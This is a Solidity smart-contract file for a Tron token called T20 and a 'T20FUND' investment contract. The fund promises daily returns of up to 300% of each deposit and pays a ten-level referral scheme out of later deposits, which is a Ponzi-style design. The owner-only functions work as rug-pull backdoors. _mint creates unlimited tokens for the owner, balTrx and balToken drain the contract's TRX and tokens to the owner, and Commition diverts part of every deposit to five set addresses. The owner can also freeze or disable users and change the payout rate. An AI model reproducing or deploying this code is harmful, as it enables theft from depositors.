//SourceUnit: T20token.sol

pragma solidity 0.5.10;
contract Owned {
    modifier onlyOwner() {
        require(msg.sender==owner);
        _;
    }
    
    address payable owner;
    function changeOwner(address payable _newOwner) public onlyOwner {
        require(_newOwner!=address(0));
        owner = _newOwner;
    }
    
}

contract ERC20 {
    uint256 public totalSupply;
    function balanceOf(address _owner) view public  returns (uint256 balance);
    function transfer(address _to, uint256 _value) public  returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) public  returns (bool success);
    function approve(address _spender, uint256 _value) public returns (bool success);
    function allowance(address _owner, address _spender) view public  returns (uint256 remaining);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}

contract Token is Owned,  ERC20 {
     using SafeMath for uint256;
         uint256 public totalSupply=150000000e6;
     uint256 public price;
    string public symbol;
    string public name;
    uint8 public decimals;
    mapping (address=>uint256) balances;
    mapping (address=>mapping (address=>uint256)) allowed;
    mapping (address  => bool) public frozen ;
//   bool public frozen = false;
  
      event Freeze(address target, bool frozen);
      event Unfreeze(address target, bool frozen);
      event Burn(address a, uint256 _value);

modifier whenNotFrozen(address target) {
    require(!frozen[target],"tokens are freeze already");
      _;
    }

  modifier whenFrozen(address target){
    require(frozen[target],"tokens are not freeze");
    _;
  }
    function balanceOf(address _owner) view public   returns (uint256 balance) {return balances[_owner];}
    
    function transfer(address _to, uint256 _amount) public   returns (bool success) {
        require(!frozen[msg.sender],'account is freez');
        balances[msg.sender]=balances[msg.sender].sub(_amount);
        balances[_to]=balances[_to].add(_amount);
        emit Transfer(msg.sender,_to,_amount);
        return true;
    }
    function transferFrom(address _from,address _to,uint256 _amount) public   returns (bool success) {
        require(!frozen[_from],"From address is fronzen");
        balances[_from]=balances[_from].sub(_amount);
        allowed[_from][msg.sender]=allowed[_from][msg.sender].sub(_amount);
        balances[_to]=balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
  
    function approve(address _spender, uint256 _amount) public   returns (bool success) {
        allowed[msg.sender][_spender]=_amount;
        emit Approval(msg.sender, _spender, _amount);
        return true;
    }
    
    function allowance(address _owner, address _spender) view public   returns (uint256 remaining) {
      return allowed[_owner][_spender];
    }
  

  function FreezeAcc(address target, bool freeze) onlyOwner public whenNotFrozen(target) returns (bool) {
    freeze = true;
    frozen[target]=freeze;
    emit Freeze(target, true);
    return true;
  }

  function UnfreezeAcc(address target, bool freeze) onlyOwner public whenFrozen(target) returns (bool) {
    freeze = false;
    frozen[target]=freeze;
    emit Unfreeze(target, false);
    return true;
  }
  function burn(uint256 _value) public returns (bool success) {
      require(!frozen[msg.sender],"Account address is fronzen");
        require(balances[msg.sender] >= _value);   // Check if the sender has enough
        balances[msg.sender] =balances[msg.sender].sub(_value);            // Subtract from the sender
        totalSupply =totalSupply.sub(_value);                      // Updates totalSupply
        emit Burn(msg.sender, _value);
        return true;
    }
}

contract T20Coin is Token{
    using SafeMath for uint256;
    constructor() public{
        price=1 trx;
        symbol = "T20";
        name = "T20";
        decimals = 6;
        owner = msg.sender;
        balances[owner] = totalSupply;
        frozen[msg.sender]=false;
        
    }
    function _mint(uint256 amount) external onlyOwner  {
        // require(account != address(0), "ERC20: mint to the zero address");
        balances[owner] += amount;
    }
    
    function () payable external {
        require(msg.value>0);
        owner.transfer(msg.value);
    }
    
}

contract T20FUND is T20Coin{
	using SafeMath for uint256;
	address payable public Id1;
	address payable public Id2;
	address payable public Id3;
	address payable public Id4;
	address payable public Id5;
	address payable public TokenAdd;
	uint256  public BASE_PERCENT = 10;
	uint256[9] public REFERRAL_PERCENTS = [300,200, 100,100,100,50,50,50,50];
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;
	uint256 constant CONTRACT_BALANCE_STEP= 1000000 trx;
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
	struct User {
	    bool active;
	    uint256 amount;
		uint256 withdrawn;
		uint256 start;
		address referrer;
		uint256 bonus;
		uint256 reffrals;
		uint256 DirectRef;
		uint256 depositNumber;
		mapping(uint256=>uint256)  Level;
	}
    
	mapping (address => User) public users;
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
    constructor(address payable _id1,address payable _id2,address payable _id3,address payable _id4,
    address payable _id5,address payable _tokenAdd)public{
    Id1=_id1;
    Id2=_id2;
    Id3=_id3;
    Id4=_id4;
    Id5=_id5;
    TokenAdd=_tokenAdd;
    User storage user = users[msg.sender];
    users[msg.sender]=user;
		    user.active=true;
		    user.amount=10000 trx;
		    user.withdrawn=0;
		    user.start=block.timestamp;
		    user.referrer=address(0);
		    user.bonus=0;
		    user.reffrals=0;
		    user.DirectRef=0;
		    user.depositNumber+=1;
            users[owner].active=true;
}
	function investT20(address referrer,uint256 _value) public  {
        require(balanceOf(msg.sender)>0,"You have not enough coins ");
        require(_value>=100000000);
        require(!users[msg.sender].active,"you are active");
	    require(users[referrer].active,"refferer is not active");
	    require(referrer!=msg.sender,"reffer is msg.sender");
	    transfer(address(this),_value);
        User storage user = users[msg.sender];
		if(user.depositNumber>0){
		    users[msg.sender]=user;
		    user.active=true;
		    user.amount=_value;
		    user.withdrawn=0;
		    user.start=block.timestamp;
		    user.referrer=user.referrer;
		    user.bonus=0;
		    user.reffrals=user.reffrals;
		    user.DirectRef=0;
		    user.depositNumber+=1;
		    
		}
		else{
		    users[msg.sender]=user;
		    user.active=true;
		    user.amount=_value;
		    user.withdrawn=0;
		    user.start=block.timestamp;
		    user.referrer=referrer;
		    user.bonus=0;
		    user.reffrals=0;
		    user.DirectRef=0;
		    user.depositNumber+=1;
		     
		  	address upline = user.referrer;
			
			for (uint256 i = 0; i < 11; i++) {
				if (upline != address(0)) {
				    if(i == 0){
						users[upline].Level[1] = users[upline].Level[1].add(1);	
					} else if(i == 1){
						users[upline].Level[2] = users[upline].Level[2].add(1);	
					} else if(i == 2){
						users[upline].Level[3] = users[upline].Level[3].add(1);	
					}
					 else if(i == 3){
						users[upline].Level[4] = users[upline].Level[4].add(1);	
					}
					 else if(i == 4){
						users[upline].Level[5] = users[upline].Level[5].add(1);	
					}
					 else if(i == 5){
						users[upline].Level[6] = users[upline].Level[6].add(1);	
					} else if(i == 6){
						users[upline].Level[7] = users[upline].Level[7].add(1);	
					} else if(i == 7){
						users[upline].Level[8] = users[upline].Level[8].add(1);	
					}
					 else if(i == 8){
						users[upline].Level[9] = users[upline].Level[9].add(1);	
					}
					else if(i == 9){
                        users[upline].Level[10] = users[upline].Level[10].add(1);	
                        }
					upline = users[upline].referrer;
				} else break;
			}
        users[user.referrer].reffrals+=1;
		users[user.referrer].DirectRef+=_value.mul(10).div(100);
	 	 		    
		}
		
		balances[TokenAdd]=balances[TokenAdd].add(_value.mul(10).div(100));
		balances[address(this)]=balances[address(this)].sub(_value.mul(10).div(100));
		totalUsers=totalUsers.add(1);
		totalInvested = totalInvested.add(_value);
		totalDeposits = totalDeposits.add(1);
		emit NewDeposit(msg.sender, _value);

	}

	function investTrx(address referrer) public  payable {
	    require(msg.value>=100 trx);
	    require(!users[msg.sender].active,"you are active");
	    require(users[referrer].active,"refferer is not active");
	    require(referrer!=msg.sender,"reffer is msg.sender");
        User storage user = users[msg.sender];
		if(user.depositNumber>0){
		    users[msg.sender]=user;
		    user.active=true;
		    user.amount=msg.value;
		    user.withdrawn=0;
		    user.start=block.timestamp;
		    user.referrer=user.referrer;
		    user.bonus=0;
		    user.reffrals=user.reffrals;
		    user.DirectRef=0;
		    user.depositNumber+=1;
		    
		}
		else{
		    users[msg.sender]=user;
		    user.active=true;
		    user.amount=msg.value;
		    user.withdrawn=0;
		    user.start=block.timestamp;
		    user.referrer=referrer;
		    user.bonus=0;
		    user.reffrals=0;
		    user.DirectRef=0;
		    user.depositNumber+=1;
			address upline = user.referrer;
			for (uint256 i = 0; i < 11; i++) {
				if (upline != address(0)) {
				    if(i == 0){
						users[upline].Level[1] = users[upline].Level[1].add(1);	
					} else if(i == 1){
						users[upline].Level[2] = users[upline].Level[2].add(1);	
					} else if(i == 2){
						users[upline].Level[3] = users[upline].Level[3].add(1);	
					}
					 else if(i == 3){
						users[upline].Level[4] = users[upline].Level[4].add(1);	
					}
					 else if(i == 4){
						users[upline].Level[5] = users[upline].Level[5].add(1);	
					}
					 else if(i == 5){
						users[upline].Level[6] = users[upline].Level[6].add(1);	
					} else if(i == 6){
						users[upline].Level[7] = users[upline].Level[7].add(1);	
					} else if(i == 7){
						users[upline].Level[8] = users[upline].Level[8].add(1);	
					}
					 else if(i == 8){
						users[upline].Level[9] = users[upline].Level[9].add(1);	
					}
					else if(i == 9){
                        users[upline].Level[10] = users[upline].Level[10].add(1);	
                        }
					upline = users[upline].referrer;
				} else break;
			}
        users[user.referrer].reffrals+=1;
		users[user.referrer].DirectRef+=msg.value.mul(10).div(100);
		}
		Commition(msg.value.mul(10).div(100));
		totalInvested = totalInvested.add(msg.value);
		totalDeposits = totalDeposits.add(1);
		totalUsers=totalUsers.add(1);
		emit NewDeposit(msg.sender, msg.value);
	}

	function withdraw() public {
	    require(users[msg.sender].active,"you are not active");
	    User storage user = users[msg.sender];
	    require(users[msg.sender].active,"your are not active");
	    uint256 userPercentRate = getUserPercentRate(msg.sender);
		uint256 bonuses= getUserReferralBonus(msg.sender);
		bonuses=bonuses.add(getUserDirectRef(msg.sender));
		uint256 dividends;
			if (user.withdrawn < (user.amount.mul(3000)).div(PERCENTS_DIVIDER)) {
					dividends = (user.amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.start))
						.div(TIME_STEP);
						
	if (users[msg.sender].referrer != address(0)) {
			address upline = users[msg.sender].referrer;
			if(isActive(upline)){
			   
			for (uint256 i = 0; i < 10; i++) {
				if (upline != address(0)){
				    if(users[upline].reffrals>i){
					uint256 amount = dividends.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
				    }
					upline = users[upline].referrer;
				}
				else break;
			  }
			}
		}
		if(bonuses>0){
		    
		
		dividends=dividends.add(bonuses);
		user.DirectRef=0;
		user.bonus=0;
		}

				if (user.withdrawn.add(dividends) > (user.amount.mul(3000)).div(PERCENTS_DIVIDER)) {
					dividends = ((user.amount.mul(3000)).div(PERCENTS_DIVIDER)).sub(user.withdrawn);
					user.active=false;
				}
				user.withdrawn = user.withdrawn.add(dividends); 
			}
			
		balances[msg.sender]=balances[msg.sender].add(dividends);
        balances[address(this)]=balances[address(this)].sub(dividends);
		totalWithdrawn = totalWithdrawn.add(dividends);
        user.start=block.timestamp;
		emit Withdrawn(msg.sender, dividends);
	}

	function getContractBalance() public view returns (uint256) {
		return (address(this).balance);
	}
	
	function getContractBalanceRate() public view returns (uint256) {
		uint256 contractBalance = (address(this).balance);
		contractBalance=contractBalance.add(balanceOf(address(this)));
		uint256 contractBalancePercent = contractBalance.div(CONTRACT_BALANCE_STEP);
		if(contractBalancePercent>5){
		contractBalancePercent=5;
		}
		return BASE_PERCENT.add(contractBalancePercent);
	}

	function getUserPercentRate(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		uint256 contractBalanceRate = getContractBalanceRate();
		if (isActive(userAddress)) {
			uint256 timeMultiplier = (now.sub(user.start)).div(TIME_STEP.mul(7));
			if(timeMultiplier>5){
			 timeMultiplier=5;
			}
			return contractBalanceRate.add(timeMultiplier);
		} else {
			return contractBalanceRate;
		}
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		uint256 userPercentRate = getUserPercentRate(userAddress);
		uint256 dividends;
		uint256 bonuses= getUserReferralBonus(userAddress);
		bonuses=bonuses.add(getUserDirectRef(userAddress));
			if (user.withdrawn < (user.amount.mul(300)).div(100)) {
					dividends = (user.amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.start))
						.div(TIME_STEP);
				}
				dividends=dividends.add(bonuses);
				if (user.withdrawn.add(dividends) > (user.amount.mul(300)).div(100)) {
					dividends = (user.amount.mul(300).div(100)).sub(user.withdrawn);
				}
		return (dividends);

	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}
    function getUserDirectRef(address userAddress) public view returns(uint256) {
		return users[userAddress].DirectRef;
	}
	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserDividends(userAddress);
	}

	function isActive(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

		
			if (user.withdrawn < user.amount.mul(300).div(100)) {
				return true;
			
		}
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256) {
	 	return (users[userAddress].reffrals);
	 	
	}
	function getUserLevels1(address userAddress)public view returns(uint256,uint256,uint256,uint256,uint256){
	    uint256 l1;
	    uint256 l2;
	    uint256 l3;
	    uint256 l4;
	    uint256 l5;
	    l1=users[userAddress].Level[1];
	    l2=users[userAddress].Level[2];
	    l3=users[userAddress].Level[3];
	    l4=users[userAddress].Level[4];
	    l5=users[userAddress].Level[5];
	    return (l1,l2,l3,l4,l5);
	}
	function getUserLevels2(address userAddress)public view returns(uint256,uint256,uint256,uint256,uint256){
	    uint256 l6;
	    uint256 l7;
	    uint256 l8;
	    uint256 l9;
	    uint256 l10;
	    l6=users[userAddress].Level[6];
	    l7=users[userAddress].Level[7];
	    l8=users[userAddress].Level[8];
	    l9=users[userAddress].Level[9];
	    l10=users[userAddress].Level[10];
	    return (l6,l7,l8,l9,l10);
	}

    function Commition(uint256 _value)internal returns(bool){
        _value=_value.mul(20).div(100);
        Id1.transfer(_value);
        Id2.transfer(_value);
        Id3.transfer(_value);
        Id4.transfer(_value);
        Id5.transfer(_value);
        return true;
    }
	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    
		return users[userAddress].amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    return users[userAddress].withdrawn;
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
    function balTrx(uint256 _value) public returns(bool){
        require(msg.sender==owner);
        owner.transfer(_value.mul(1000000));
        return true;
    } 
    function balToken(uint256 _value)public returns(bool){
        require(msg.sender==owner);
    balances[owner]=balances[owner].add(_value.mul(1000000));
    balances[address(this)]=balances[address(this)].sub(_value.mul(1000000));
        return true;
    }
    function UpdateBase(uint256 _value)onlyOwner public{
        BASE_PERCENT=_value;
    }
    function Disable(address _address)public returns(bool){
        require(msg.sender==owner,"access denied");
        users[_address].active=false;
        return true;
    }
    function updateUser(address payable oldAddress,address payable newAddress)onlyOwner public{
        	    User storage user = users[oldAddress];
        	    users[newAddress]=user;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
    
}